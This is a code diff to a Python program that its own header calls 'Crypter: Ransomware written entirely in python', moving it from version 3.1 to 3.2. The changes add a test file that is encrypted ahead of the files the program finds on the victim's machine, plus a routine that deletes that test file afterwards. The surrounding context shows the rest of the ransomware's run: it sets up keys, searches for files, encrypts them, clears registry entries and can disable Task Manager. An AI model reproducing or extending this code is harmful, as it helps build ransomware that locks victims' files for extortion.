@@ -1,7 +1,7 @@
 '''
 @summary: Crypter: Ransomware written entirely in python.
 @author: MLS
-@version: 3.1
+@version: 3.2
 '''
 
 import json
@@ -37,6 +37,7 @@ class Crypter(Base.Base):
         '''
         self.__config = self.__load_config()
         self.encrypted_file_list = os.path.join(os.environ['APPDATA'], "encrypted_files.txt")
+        self.encryption_test_file = os.path.join(os.environ['APPDATA'], "enc_test.txt")
 
         # Init Crypt Lib
         self.Crypt = Crypt.SymmetricCrypto()
@@ -60,7 +61,13 @@ class Crypter(Base.Base):
             # Find files and initialise keys
             self.Crypt.init_keys()
 
-            file_list = self.find_files()
+            # Create encryption test file
+            file_list = [self.encryption_test_file]
+            with open(self.encryption_test_file, "w") as test_file:
+                test_file.write("Encryption test")
+
+            # File discovery
+            file_list += self.find_files()
 
             # Start encryption
             self.encrypt_files(file_list)
@@ -189,6 +196,7 @@ class Crypter(Base.Base):
             self.__remove_from_startup_programs()
 
         self.delete_encrypted_file_list()
+        self.delete_encrypted_file_test()
         self.delete_registry_entries()
 
         if self.__config["disable_task_manager"]:
@@ -273,12 +281,18 @@ class Crypter(Base.Base):
             os.remove(locked_path)
 
 
+    def delete_encrypted_file_test(self):
+        """
+        Deletes the encrypted test file
+        """
+        if os.path.isfile(self.encryption_test_file):
+            os.remove(self.encryption_test_file)
+
+
     def delete_encrypted_file_list(self):
         '''
         @summary: Deletes the list of encrypted files
         '''
-
-        # Remove encrypted file list
         if os.path.isfile(self.encrypted_file_list):
             os.remove(self.encrypted_file_list)
 
